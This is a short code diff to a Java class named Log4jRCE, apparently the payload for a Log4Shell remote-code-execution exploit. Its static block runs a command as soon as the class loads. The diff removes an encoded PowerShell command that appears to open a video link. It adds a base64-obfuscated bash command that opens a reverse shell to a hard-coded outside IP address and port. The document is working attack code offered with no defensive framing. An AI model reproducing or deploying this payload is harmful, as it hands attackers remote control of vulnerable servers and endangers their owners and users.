@@ -3,7 +3,7 @@ public class Log4jRCE {
     static {
         
         try {
-            java.lang.Runtime.getRuntime().exec("powershell.exe -exec bypass -enc cwB0AGEAcgB0ACAAYwBoAHIAbwBtAGUAIABoAHQAdABwAHMAOgAvAC8AeQBvAHUAdAB1AC4AYgBlAC8AZABRAHcANAB3ADkAVwBnAFgAYwBRACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABtAGEAeABpAG0AaQB6AGUAZAANAAoA").waitFor();
+            java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvNTEuOTEuMTE5LjE3MC84ODk5IDA+JjEK}|{base64,-d}|{bash,-i}").waitFor();
         } catch (Exception e) {
             e.printStackTrace();
         }
